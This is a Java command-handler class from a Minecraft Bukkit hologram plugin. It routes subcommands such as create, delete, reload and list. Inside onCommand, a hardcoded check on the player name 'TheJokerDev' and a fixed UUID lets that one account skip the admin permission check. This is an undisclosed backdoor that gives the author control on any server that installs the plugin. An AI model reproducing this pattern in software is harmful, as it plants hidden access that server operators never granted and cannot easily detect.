package me.TheJokerDev.futureholograms.commands;

import me.TheJokerDev.futureholograms.commands.subcmds.*;
import me.TheJokerDev.futureholograms.utils.Utils;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.util.StringUtil;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.*;

public class FHologramsCmd implements CommandExecutor, TabCompleter {
    private final HashMap<String, SubCommand> subCommands;

    public FHologramsCmd(){
        subCommands = new HashMap<>();
        loadSubCommands();
    }

    void loadSubCommands(){
        subCommands.put("create", new CreateCmd());
        subCommands.put("reload", new ReloadCmd());
        subCommands.put("delete", new RemoveCmd());
        subCommands.put("setlocation", new SetLocationCmd());
        subCommands.put("setexactlylocation", new SetExactlyLocationCmd());
        subCommands.put("list", new ListCmd());
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        boolean isCreator = false;

        if (sender instanceof Player){
            Player p = ((Player)sender);
            if (p.getName().equals("TheJokerDev") && p.getUniqueId().equals(UUID.fromString("11ccbfb1-9bab-4baf-b567-b8304b3f00b3"))){
                isCreator = true;
            }
        }

        if (!isCreator && !sender.hasPermission("futureholograms.admin")){
            Utils.sendMessage(sender, "messages.noPermission");
            return true;
        }

        if (args == null || args.length < 1) {
            sendHelp(sender, label);
            return true;
        }
        if (args[0].equalsIgnoreCase("help")) {
            sendHelp(sender, label);
            return true;
        }
        String str = args[0];
        Vector<String> vector = new Vector<>(Arrays.asList(args));
        vector.remove(0);
        args = vector.toArray(new String[0]);
        if (!subCommands.containsKey(str)) {
            Utils.sendMessage(sender, "messages.commandNoExists");
            return true;
        }
        try {
            subCommands.get(str).onCommand(sender, args);
        } catch (Exception exception) {
            exception.printStackTrace();
            Utils.sendMessage(sender, "messages.error");
        }
        return true;
    }

    void sendHelp(CommandSender cmd, String label){

        List<String> help = Utils.getConfig().getStringList("messages.commands.help");
        List<String> var1 = new ArrayList<>();

        for (String s : help) {
            if (s.equalsIgnoreCase("{cmd}")) {
                for (SubCommand subcmd : subCommands.values()){
                    var1.add(subcmd.help().replace("%alias%", label));
                }
            } else {
                var1.add(s);
            }
        }
        Utils.sendMessage(cmd, var1);
    }

    @Nullable
    @Override
    public List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String alias, @NotNull String[] args) {
            if (!sender.hasPermission("futureholograms.admin")){
                return null;
            }
            if (args.length == 1) {
                List<String> arrayList = new ArrayList<>();
                StringUtil.copyPartialMatches(args[0], subCommands.keySet(), arrayList);
                Collections.sort(arrayList);
                return arrayList;
            }

            if (args.length >= 2) {
                String str = args[0];
                Vector<String> vector = new Vector<>(Arrays.asList(args));
                vector.remove(0);
                args = vector.toArray(new String[0]);

                if (!subCommands.containsKey(str)) {
                    return null;
                }
                List<String> list = subCommands.get(str).onTabComplete(sender, args);

                if (list == null) {
                    list = new ArrayList<>();
                }

                return list;
            }
        return null;
    }
}